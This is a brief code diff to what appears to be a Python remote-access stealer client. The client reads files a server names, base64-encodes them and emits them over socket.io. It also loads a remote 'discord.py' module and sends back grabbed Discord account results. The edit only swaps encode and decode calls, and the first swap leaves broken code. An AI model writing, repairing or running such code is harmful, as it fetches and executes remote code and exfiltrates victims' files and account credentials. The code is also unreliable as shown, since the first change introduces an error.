@@ -108,7 +108,7 @@ def run(data):
         if data['uuid'] == data_new['uuid']:
             with open(data_new['file_path'], 'rb') as f:
                 file = f.read()
-            file_ready = base64.b64encode(file).decode('utf-8')
+            file_ready = base64.b64encode(file).encode('utf-8')
             sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
             print("emited")
 
@@ -118,7 +118,7 @@ def run(data):
             module = create_moduel(data['url']+'discord.py')
             result = str(module.grab_discord().initialize())
             print(result)
-            sio.emit('download_file_return', {'uuid': data['uuid'], 'file_name': 'discord_account_results', 'file':  base64.b64encode(result.decode('utf-8'))})
+            sio.emit('download_file_return', {'uuid': data['uuid'], 'file_name': 'discord_account_results', 'file':  base64.b64encode(result.encode('utf-8'))})
 
 
 
